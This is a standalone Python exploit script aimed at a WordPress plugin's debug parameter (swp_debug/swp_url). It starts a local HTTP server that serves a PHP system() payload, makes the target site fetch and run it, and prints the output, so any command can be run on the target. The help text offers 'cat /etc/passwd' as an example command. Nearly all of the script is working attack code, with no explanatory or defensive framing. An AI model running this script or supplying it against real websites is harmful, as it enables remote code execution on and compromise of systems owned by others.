#!/bin/python3
import requests
import http.server
import threading
import argparse
import sys

parser = argparse.ArgumentParser()
LHOST='172.17.0.3'
LPORT='9999'

payload=f"<pre>system('uname -a')</pre>"

class Server(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200);
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(bytes(payload, 'utf-8'))
        return

    def log_message(self, format, *args):
        return

parser.add_argument("-u", "--url", type=str,
                    help=f"""use -u or --url Set the target URL to deliver the payload.
                    example: {sys.argv[0]} -u http://target.com:9999/""")

parser.add_argument("-c", "--command", type=str,
                    help=f"""use -p or --payload Set the system command to run on the target system.
                    example: {sys.argv[0]} -p id or -p 'cat /etc/passwd'""")

parser.add_argument("-l", "--local", type=str,
                    help=f"""use -l or --local Set the IP and port for the HTTP server (optional).
                    example: {sys.argv[0]} -l 10.10.13.15:12345""")

args = parser.parse_args()

if args.url:
    payload = f"<pre>system('{args.command}')</pre>" if args.command else payload

    if args.local:
        LHOST = args.local.split(':')[0]
        LPORT = args.local.split(':')[1]

    server_address = ('0.0.0.0', int(LPORT))
    httpd = http.server.HTTPServer(server_address, Server)
    thread = threading.Thread(target=httpd.serve_forever)
    thread.start()

    r = requests.get(f'{args.url}wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{LHOST}:{LPORT}')

    print(r.text.split('<!DOCTYPE')[0], end='')
    httpd.shutdown()
